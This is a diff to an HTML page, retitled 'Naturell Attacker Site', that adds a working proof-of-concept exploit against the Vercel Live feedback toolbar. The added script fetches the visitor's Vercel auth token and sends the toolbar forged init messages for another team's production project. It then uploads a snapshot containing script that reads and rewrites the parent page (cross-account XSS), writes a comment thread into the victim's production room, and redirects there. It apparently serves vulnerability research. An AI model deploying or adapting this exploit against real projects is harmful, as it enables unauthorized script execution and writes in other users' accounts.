@@ -1,19 +1,316 @@
 <!doctype html>
+<script>
+(() => {
+  const LIVE_ORIGIN = 'https://vercel.live';
+  const PRODUCTION_HOST =
+    'naturell-toolbar-fork-victim-20260809-h763y6e4f-testteam22-687d.vercel.app';
+  const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
+  const OWNER_ID = 'team_qmp53qfzAPgwkguhRzHvSwgV';
+  const PRODUCTION_BRANCH = 'main';
+  const DOM_MARKER = 'naturell_toolbar_git_preview_production_xss_20260809';
+  const SOURCE_MARKER = 'naturell_git_preview_delivery_source_20260809';
+  const SHARE_SETUP = new URLSearchParams(location.search).get('shareSetup') === '1';
+  let vercelAuthJWE = null;
+
+  window.__naturellDelivery = {
+    sourceMarker: SOURCE_MARKER,
+    phase: 'bootstrap',
+    readyAccepted: false,
+    initAccepted: false,
+    uploadAccepted: false,
+    pushAccepted: false,
+    target: null,
+    targets: [],
+    readyCount: 0,
+    initReplyCount: 0,
+    initRejectedCount: 0,
+    candidateSessionPresent: false,
+    candidateDeploymentTarget: null,
+    candidateProjectMatched: false,
+    candidateRoomPresent: false,
+    roomId: null,
+    uploadReplyId: null,
+    pushReplyId: null,
+    shareSetup: SHARE_SETUP,
+    shareSetupAuthenticated: false,
+    shareTeamId: null,
+    jweFetchStatus: null,
+    jwePresent: false,
+  };
+
+  function recordSafeState() {
+    const state = window.__naturellDelivery;
+    window.name = `naturell-toolbar-git:${JSON.stringify({
+      phase: state.phase,
+      readyAccepted: state.readyAccepted,
+      initAccepted: state.initAccepted,
+      uploadAccepted: state.uploadAccepted,
+      pushAccepted: state.pushAccepted,
+      jweFetchStatus: state.jweFetchStatus,
+      jwePresent: state.jwePresent,
+      initReplyCount: state.initReplyCount,
+      initRejectedCount: state.initRejectedCount,
+      candidateSessionPresent: state.candidateSessionPresent,
+      candidateDeploymentTarget: state.candidateDeploymentTarget,
+      candidateProjectMatched: state.candidateProjectMatched,
+      candidateRoomPresent: state.candidateRoomPresent,
+    })}`;
+  }
+
+  function setPhase(phase) {
+    window.__naturellDelivery.phase = phase;
+    if (document.documentElement) {
+      document.documentElement.dataset.deliveryPhase = phase;
+    }
+    recordSafeState();
+  }
+
+  function loadToolbar() {
+    const script = document.createElement('script');
+    script.async = true;
+    script.dataset.explicitOptIn = 'true';
+    script.src = 'https://vercel.live/_next-live/feedback/feedback.js';
+    document.head.append(script);
+  }
+
+  async function prepareToolbar() {
+    if (!SHARE_SETUP) {
+      setPhase('jwe-fetching');
+      try {
+        const response = await fetch('/.well-known/vercel/jwe', {
+          credentials: 'include',
+          cache: 'no-store',
+        });
+        window.__naturellDelivery.jweFetchStatus = response.status;
+        if (response.status === 200) {
+          vercelAuthJWE = await response.text();
+        }
+      } catch {}
+      window.__naturellDelivery.jwePresent = Boolean(vercelAuthJWE);
+      if (!vercelAuthJWE) {
+        setPhase('jwe-unavailable');
+        return;
+      }
+    }
+    setPhase('waiting-for-toolbar-ready');
+    loadToolbar();
+  }
+
+  function randomHex(byteCount) {
+    const bytes = new Uint8Array(byteCount);
+    crypto.getRandomValues(bytes);
+    return Array.from(bytes, byte => byte.toString(16).padStart(2, '0')).join('');
+  }
+
+  function send(type, replyId, payload) {
+    const state = window.__naturellDelivery;
+    state.target.postMessage({type, replyId, payload}, LIVE_ORIGIN);
+  }
+
+  function activeSnapshotHtml() {
+    return `<!doctype html>
+<meta charset="utf-8">
+<title>Naturell Git Preview synthetic snapshot</title>
+<p>${DOM_MARKER}</p>
+<scr${''}ipt>
+(() => {
+  const marker = ${JSON.stringify(DOM_MARKER)};
+  const source = ${JSON.stringify(SOURCE_MARKER)};
+  const fixtureNode = parent.document.querySelector('#marker');
+  const valueRead = fixtureNode ? fixtureNode.textContent : '';
+  parent.document.documentElement.setAttribute(
+    'data-vercel-cross-account-xss', marker
+  );
+  parent.document.documentElement.setAttribute(
+    'data-vercel-cross-account-read', valueRead
+  );
+  parent.document.documentElement.setAttribute(
+    'data-vercel-cross-account-source', source
+  );
+  if (fixtureNode) fixtureNode.textContent = marker;
+  parent.postMessage({
+    type: 'naturell-git-preview-snapshot-marker',
+    marker,
+    source,
+    valueRead,
+  }, '*');
+})();
+<\/scr${''}ipt>`;
+  }
+
+  addEventListener('message', event => {
+    const state = window.__naturellDelivery;
+    if (event.origin !== LIVE_ORIGIN || !event.data) return;
+
+    if (event.data.type === 'ready' && event.source) {
+      if (SHARE_SETUP) {
+        if (state.readyAccepted) return;
+        state.readyAccepted = true;
+        state.readyCount = 1;
+        state.target = event.source;
+        setPhase('share-setup-toolbar-ready');
+        return;
+      }
+      if (state.targets.includes(event.source)) return;
+      state.targets.push(event.source);
+      state.readyAccepted = true;
+      state.readyCount = state.targets.length;
+      setPhase('forged-init-sent');
+      event.source.postMessage({
+        type: 'preview-origin',
+        previewOrigin: window.origin,
+        path: window.location.pathname + window.location.search,
+      }, LIVE_ORIGIN);
+      event.source.postMessage({
+        type: 'init',
+        authOptions: {
+          projectId: PROJECT_ID,
+          ownerId: OWNER_ID,
+          branch: PRODUCTION_BRANCH,
+        },
+        origin: LIVE_ORIGIN,
+        page: '/',
+      }, LIVE_ORIGIN);
+      if (!state.initRejectTimer) {
+        state.initRejectTimer = setTimeout(() => {
+          if (!state.initAccepted) setPhase('init-rejected');
+        }, 12000);
+      }
+      return;
+    }
+
+    if (
+      event.data.type === 'init-reply' &&
+      (SHARE_SETUP
+        ? event.source === state.target
+        : state.targets.includes(event.source)) &&
+      !state.initAccepted
+    ) {
+      state.initReplyCount += 1;
+      const session = event.data.existingAuth?.session;
+      state.candidateSessionPresent = Boolean(session);
+      state.candidateDeploymentTarget = session?.deploymentTarget || null;
+      state.candidateProjectMatched = session?.projectId === PROJECT_ID;
+      state.candidateRoomPresent = Boolean(session?.roomId);
+      if (SHARE_SETUP) {
+        state.shareSetupAuthenticated = Boolean(session);
+        state.shareTeamId = session?.teamId || null;
+        state.initAccepted = Boolean(session);
+        setPhase(session ? 'share-setup-authenticated' : 'share-setup-rejected');
+        return;
+      }
+      if (
+        !session ||
+        session.deploymentTarget !== 'production' ||
+        session.projectId !== PROJECT_ID ||
+        !session.roomId
+      ) {
+        state.initRejectedCount += 1;
+        setPhase('init-candidate-rejected');
+        return;
+      }
+      if (state.initRejectTimer) clearTimeout(state.initRejectTimer);
+      state.target = event.source;
+      state.initAccepted = true;
+      state.roomId = session.roomId;
+      state.uploadReplyId = `naturell-upload-${randomHex(8)}`;
+      const snapshotId = `naturell-git-preview-${randomHex(12)}`;
+      const blob = new Blob([activeSnapshotHtml()], {type: 'text/html'});
+      setPhase('snapshot-upload-sent');
+      send('upload-snapshot', state.uploadReplyId, {snapshotId, blob});
+      return;
+    }
+
+    if (
+      event.data.type !== 'live-frame-reply' ||
+      event.source !== state.target ||
+      !event.data.id
+    ) return;
+
+    if (event.data.id === state.uploadReplyId && !state.uploadAccepted) {
+      const snapshotKey = event.data.result?.id;
+      if (event.data.error || typeof snapshotKey !== 'string') {
+        setPhase('snapshot-upload-rejected');
+        return;
+      }
+      state.uploadAccepted = true;
+      const profileId = randomHex(16);
+      const clientId = randomHex(16);
+      const threadId = `naturell-git-preview-thread-${randomHex(8)}`;
+      const commentText = 'Naturell synthetic Git Preview delivery proof';
+      const mutation = {
+        profileID: profileId,
+        clientID: clientId,
+        mutations: [{
+          id: 1,
+          name: 'createCommentThread',
+          args: {
+            id: threadId,
+            nodeId: 'body',
+            x: 0.5,
+            y: 0.5,
+            shortId: 0,
+            page: '/',
+            pageTitle: 'Naturell Git Preview synthetic snapshot proof',
+            screenWidth: 1280,
+            screenHeight: 720,
+            devicePixelRatio: 1,
+            snapshotKey,
+            firstComment: {
+              id: `naturell-git-preview-comment-${randomHex(8)}`,
+              text: commentText,
+              body: [{
+                type: 'paragraph',
+                children: [{text: commentText}],
+              }],
+            },
+          },
+          timestamp: Date.now(),
+        }],
+        pushVersion: 0,
+        schemaVersion: '',
+      };
+      state.threadId = threadId;
+      state.pushReplyId = `naturell-push-${randomHex(8)}`;
+      setPhase('production-thread-write-sent');
+      send('push', state.pushReplyId, {
+        roomId: state.roomId,
+        body: JSON.stringify(mutation),
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Replicache-RequestID': `${clientId}-${randomHex(4)}-0`,
+        },
+      });
+      return;
+    }
+
+    if (event.data.id === state.pushReplyId && !state.pushAccepted) {
+      if (event.data.error || event.data.result?.init?.status !== 200) {
+        setPhase('production-thread-write-rejected');
+        return;
+      }
+      state.pushAccepted = true;
+      setPhase('same-tab-production-navigation');
+      const destination = new URL(`https://${PRODUCTION_HOST}/`);
+      destination.searchParams.set('vercelThreadId', state.threadId);
+      destination.searchParams.set('deliverySource', SOURCE_MARKER);
+      location.replace(destination.href);
+    }
+  });
+
+  prepareToolbar();
+})();
+</script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Naturell Vercel Fork Victim Fixture</title>
+<title>Naturell Attacker Site</title>
 <style>
   :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
   body { min-height: 100vh; display: grid; place-items: center; margin: 0; }
   main { text-align: center; }
 </style>
 <main>
-  <h1>Victim Production fixture ready</h1>
-  <p id="marker">naturell_vercel_fork_victim_fixture_20260809</p>
+  <h1>Preview ready</h1>
+  <p>Naturell synthetic Git Preview delivery fixture</p>
 </main>
-<script
-  async
-  data-explicit-opt-in="true"
-  src="https://vercel.live/_next-live/feedback/feedback.js"
-></script>
-
